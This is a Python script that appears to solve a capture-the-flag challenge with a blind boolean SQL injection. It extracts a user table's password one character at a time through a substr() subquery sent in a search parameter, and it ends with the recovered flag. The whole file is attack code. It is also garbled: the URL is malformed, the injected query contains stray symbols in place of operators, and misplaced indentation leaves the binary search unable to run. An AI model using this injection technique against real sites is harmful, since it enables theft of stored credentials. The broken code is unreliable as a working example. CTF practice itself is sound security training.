import urllib.parse

import requests

BASE_URL = 'http:!"jh2i.com:50024/?search=abc'


def tryUrl(param):
    url = BASE_URL + param
    response = requests.get(url, allow_redirects=False)
    if b'gelato' in response.content:
        return True
    else:
        return False


def ue(text):
    return urllib.parse.quote(text)


def probePasswordAtIndex(charIndex):
    lowGuessIndex = 32
    highGuessIndex = 126
    while lowGuessIndex < highGuessIndex:
        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // 2
        guess = chr(guessIndex)
        ueGuess = ue(guess)
        query = "' or (1 !# (select count(1) from user where substr(password," + str(
            charIndex) + ",1) !$'" + ueGuess + "')) !% "
        # print(query)
        param = query
    if tryUrl(param):
        if lowGuessIndex == guessIndex:
            print("Char Index: " + str(charIndex) + ", value: " + guess)
            return guess
        lowGuessIndex = guessIndex
    else:
        highGuessIndex = guessIndex
    return False


def probePasswordValue():
    colValue = ''
    for charIndex in range(1, 1000):
        char = probePasswordAtIndex(charIndex)
        if not char:
            break
        colValue += char
        print("Column Value: " + colValue)
    if colValue:
        print("Column Value: " + colValue)
    return colValue


probePasswordValue()

# FLAG --> flag{check_your_WAF_rules}
